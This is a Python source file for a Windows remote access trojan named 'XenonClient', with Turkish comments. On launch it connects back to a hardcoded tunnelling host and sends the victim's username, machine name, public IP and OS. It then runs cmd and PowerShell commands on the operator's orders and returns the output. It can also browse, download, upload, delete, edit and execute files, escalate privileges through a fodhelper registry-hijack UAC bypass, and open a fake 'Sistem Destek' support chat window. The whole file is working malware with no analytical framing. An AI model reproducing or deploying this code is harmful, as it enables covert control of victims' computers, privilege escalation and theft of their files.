import socket
import threading
import subprocess
import os
import platform
import json
import webbrowser
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext
import winreg
import base64
import tempfile
import urllib.request
import math
import queue

# --- BAĞLANTI AYARLARI ---
HOST = "uwtd3ffva.localto.net"
PORT = 1205
# -------------------------

class XenonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.chat_win = None
        self.chat_box = None
        self.chat_running = False
        
        # Ses için pygame mixer
        self.mixer_initialized = False
        self.audio_queue = queue.Queue()
        self.audio_thread_running = True
        self.current_audio_file = None
        threading.Thread(target=self.audio_worker, daemon=True).start()

    def audio_worker(self):
        """Ses komutlarını işleyen thread"""
        import pygame
        pygame.mixer.init()
        self.mixer_initialized = True
        while self.audio_thread_running:
            try:
                cmd = self.audio_queue.get(timeout=0.5)
                if cmd[0] == "play":
                    filepath = cmd[1]
                    pygame.mixer.music.load(filepath)
                    pygame.mixer.music.play()
                elif cmd[0] == "pause":
                    pygame.mixer.music.pause()
                elif cmd[0] == "resume":
                    pygame.mixer.music.unpause()
                elif cmd[0] == "stop":
                    pygame.mixer.music.stop()
                elif cmd[0] == "volume":
                    vol = cmd[1] / 100.0
                    pygame.mixer.music.set_volume(vol)
            except queue.Empty:
                pass
            except Exception as e:
                print(f"Ses hatası: {e}")

    # ---------- SİSTEM BİLGİSİ ----------
    def get_sys_info(self):
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
                public_ip = resp.read().decode('utf-8')
        except:
            public_ip = "Unknown"
        
        try:
            with urllib.request.urlopen('https://ipapi.co/country/', timeout=5) as resp:
                country = resp.read().decode('utf-8').strip()
        except:
            country = "TR"
        
        return json.dumps({
            "id": f"{os.getlogin()}@{platform.node()}",
            "ip": public_ip,
            "country": country,
            "os": f"{platform.system()} {platform.release()}"
        })

    # ---------- UAC BYPASS ----------
    def uac_bypass(self, cmd_to_run):
        try:
            path = r"Software\Classes\ms-settings\Shell\Open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd_to_run)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            return True
        except:
            return False

    # ---------- BAĞLANTI VE ANA DÖNGÜ ----------
    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                self.sock.send(self.get_sys_info().encode("utf-8"))
                self.listen()
            except:
                time.sleep(5)

    def listen(self):
        # Kısmi mesajları birleştirmek için buffer
        buffer = ""
        while True:
            try:
                data = self.sock.recv(16384).decode("utf-8")
                if not data:
                    break
                buffer += data
                
                # Mesajlar newline ile ayrılmış olsaydı daha kolay olurdu, ama şu anki protokolde öyle değil.
                # Basitçe her mesajı işleyelim (tek seferde tam gelmeyebilir, ama çoğu durumda sorun olmaz)
                # Daha sağlam bir çözüm için mesaj uzunluğu prefix'i eklenmeli.
                
                # Şimdilik satır satır ayırmaya çalışalım (yeni eklediğimiz komutlar newline ile bitebilir)
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    self.process_message(line)
            except Exception as e:
                print(f"Listen hatası: {e}")
                break
        if self.sock:
            self.sock.close()

    def process_message(self, data):
        if not data:
            return
        
        # ----- MESAJ -----
        if data.startswith("msg|"):
            threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|")[1])).start()

        # ----- SOHBET -----
        elif data == "chat_open":
            if not self.chat_running:
                threading.Thread(target=self.gui_chat, daemon=True).start()

        elif data.startswith("chat_msg|"):
            if self.chat_box:
                try:
                    self.chat_box.config(state="normal")
                    self.chat_box.insert(tk.END, f"DESTEK: {data.split('|')[1]}\n")
                    self.chat_box.config(state="disabled")
                    self.chat_box.see(tk.END)
                except:
                    pass

        elif data == "chat_close":
            if self.chat_win:
                self.chat_running = False
                try:
                    self.chat_win.quit()
                except:
                    pass

        # ----- BEEP -----
        elif data == "beep":
            if platform.system() == "Windows":
                import winsound
                winsound.Beep(800, 500)

        # ----- URL AÇ -----
        elif data.startswith("open_url|"):
            webbrowser.open(data.split("|")[1])

        # ----- SHELL KOMUTLARI (Kalıcı değil, her seferinde yeni process) -----
        elif data.startswith("shell|"):
            self.run_cmd(data.split("|")[1], "cmd")

        elif data.startswith("ps|"):
            self.run_cmd(data.split("|")[1], "powershell")

        # ----- YÖNETİCİ BYPASS -----
        elif data.startswith("elevate|"):
            target = "cmd.exe" if "cmd" in data else "powershell.exe"
            self.uac_bypass(target)

        # ----- SES KONTROL -----
        elif data.startswith("audio_upload|"):
            self.handle_audio_upload(data)

        elif data.startswith("audio_play|"):
            filename = data.split("|")[1]
            self.audio_queue.put(("play", filename))

        elif data == "audio_pause":
            self.audio_queue.put(("pause",))

        elif data == "audio_resume":
            self.audio_queue.put(("resume",))

        elif data == "audio_stop":
            self.audio_queue.put(("stop",))

        elif data.startswith("audio_volume|"):
            vol = int(data.split("|")[1])
            self.audio_queue.put(("volume", vol))

        # ----- DOSYA YÖNETİCİSİ KOMUTLARI -----
        elif data.startswith("file_list|"):
            path = data.split("|", 1)[1]
            threading.Thread(target=self.handle_file_list, args=(path,), daemon=True).start()

        elif data.startswith("file_download|"):
            path = data.split("|", 1)[1]
            threading.Thread(target=self.handle_file_download, args=(path,), daemon=True).start()

        elif data.startswith("file_upload|"):
            parts = data.split("|", 2)
            if len(parts) == 3:
                remote_path = parts[1]
                encoded = parts[2]
                threading.Thread(target=self.handle_file_upload, args=(remote_path, encoded), daemon=True).start()

        elif data.startswith("file_delete|"):
            path = data.split("|", 1)[1]
            threading.Thread(target=self.handle_file_delete, args=(path,), daemon=True).start()

        elif data.startswith("file_execute|"):
            path = data.split("|", 1)[1]
            threading.Thread(target=self.handle_file_execute, args=(path,), daemon=True).start()

        elif data.startswith("file_edit_get|"):
            path = data.split("|", 1)[1]
            threading.Thread(target=self.handle_file_edit_get, args=(path,), daemon=True).start()

        elif data.startswith("file_edit_save|"):
            parts = data.split("|", 2)
            if len(parts) == 3:
                path = parts[1]
                content = parts[2]
                threading.Thread(target=self.handle_file_edit_save, args=(path, content), daemon=True).start()

        elif data.startswith("file_mkdir|"):
            path = data.split("|", 1)[1]
            threading.Thread(target=self.handle_file_mkdir, args=(path,), daemon=True).start()

        elif data.startswith("file_touch|"):
            path = data.split("|", 1)[1]
            threading.Thread(target=self.handle_file_touch, args=(path,), daemon=True).start()

        elif data.startswith("file_rename|"):
            parts = data.split("|", 2)
            if len(parts) == 3:
                old = parts[1]
                new = parts[2]
                threading.Thread(target=self.handle_file_rename, args=(old, new), daemon=True).start()

    # ---------- SES YÜKLEME (Parçalı) ----------
    def handle_audio_upload(self, data):
        parts = data.split("|", 4)
        if len(parts) == 5:
            filename = parts[1]
            chunk_index = int(parts[2])
            total_chunks = int(parts[3])
            encoded = parts[4]
            
            # Geçici klasör oluştur
            temp_dir = os.path.join(tempfile.gettempdir(), "xenon_audio")
            os.makedirs(temp_dir, exist_ok=True)
            
            # Parçayı kaydet
            chunk_data = base64.b64decode(encoded)
            chunk_file = os.path.join(temp_dir, f"{filename}.part{chunk_index}")
            with open(chunk_file, "wb") as f:
                f.write(chunk_data)
            
            # Tüm parçalar geldiyse birleştir
            if chunk_index == total_chunks - 1:
                # Birleştir
                full_path = os.path.join(temp_dir, filename)
                with open(full_path, "wb") as outfile:
                    for i in range(total_chunks):
                        part_file = os.path.join(temp_dir, f"{filename}.part{i}")
                        with open(part_file, "rb") as infile:
                            outfile.write(infile.read())
                        os.remove(part_file)
                
                # Ses çalmaya hazır
                self.current_audio_file = full_path
                self.sock.send(f"audio_res|loaded|{filename}".encode("utf-8"))

    # ---------- SHELL KOMUT ÇALIŞTIRMA ----------
    def run_cmd(self, command_to_run, mode):
        def task():
            try:
                final_cmd = command_to_run
                if mode == "powershell":
                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
                
                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                res = (stdout + stderr).decode("cp857", errors="replace")
                
                if not res.strip():
                    res = "Komut çalıştırıldı (Çıktı yok)."
                self.sock.send(f"shell_res|{res}".encode("utf-8"))
            except Exception as e:
                self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
        threading.Thread(target=task, daemon=True).start()

    # ---------- DOSYA YÖNETİCİSİ İŞLEMLERİ ----------
    def handle_file_list(self, path):
        try:
            items = []
            with os.scandir(path) as entries:
                for entry in entries:
                    is_dir = entry.is_dir()
                    size = entry.stat().st_size if not is_dir else 0
                    modified = entry.stat().st_mtime
                    items.append({
                        "name": entry.name,
                        "is_dir": is_dir,
                        "size": size,
                        "modified": modified
                    })
            result = json.dumps(items)
            self.sock.send(f"file_res|list|{path}|{result}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|list|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_download(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            self.sock.send(f"file_res|download|{path}|{encoded}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|download|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_upload(self, remote_path, encoded):
        try:
            data = base64.b64decode(encoded)
            with open(remote_path, "wb") as f:
                f.write(data)
            self.sock.send(f"file_res|upload|{remote_path}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|upload|{remote_path}|error|{str(e)}".encode("utf-8"))

    def handle_file_delete(self, path):
        try:
            if os.path.isdir(path):
                os.rmdir(path)
            else:
                os.remove(path)
            self.sock.send(f"file_res|delete|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|delete|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_execute(self, path):
        try:
            if platform.system() == "Windows":
                os.startfile(path)
            else:
                subprocess.Popen([path])
            self.sock.send(f"file_res|execute|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|execute|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_edit_get(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            self.sock.send(f"file_res|edit_get|{path}|{content}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|edit_get|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_edit_save(self, path, content):
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
            self.sock.send(f"file_res|edit_save|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|edit_save|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_mkdir(self, path):
        try:
            os.makedirs(path, exist_ok=True)
            self.sock.send(f"file_res|mkdir|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|mkdir|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_touch(self, path):
        try:
            with open(path, "a"):
                os.utime(path, None)
            self.sock.send(f"file_res|touch|{path}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|touch|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_rename(self, old, new):
        try:
            os.rename(old, new)
            self.sock.send(f"file_res|rename|{new}|ok".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|rename|{old}|error|{str(e)}".encode("utf-8"))

    # ---------- SOHBET GUI ----------
    def gui_chat(self):
        self.chat_running = True
        self.chat_win = tk.Tk()
        self.chat_win.title("Sistem Destek")
        self.chat_win.geometry("350x450")
        self.chat_win.attributes("-topmost", True)
        
        self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
        
        ent = tk.Entry(self.chat_win)
        ent.pack(fill="x", padx=5, pady=5)

        def send_srv(e=None):
            m = ent.get()
            if m:
                self.chat_box.config(state="normal")
                self.chat_box.insert(tk.END, f"Siz: {m}\n")
                self.chat_box.config(state="disabled")
                ent.delete(0, tk.END)
                try:
                    self.sock.send(f"chat|{m}".encode("utf-8"))
                except:
                    pass
        
        ent.bind("<Return>", send_srv)
        
        def on_closing():
            self.chat_running = False
            self.chat_win.destroy()
            self.chat_win = None
            self.chat_box = None
            
        self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
        self.chat_win.mainloop()
        self.chat_running = False
        self.chat_win = None


if __name__ == "__main__":
    XenonClient(HOST, PORT).connect()
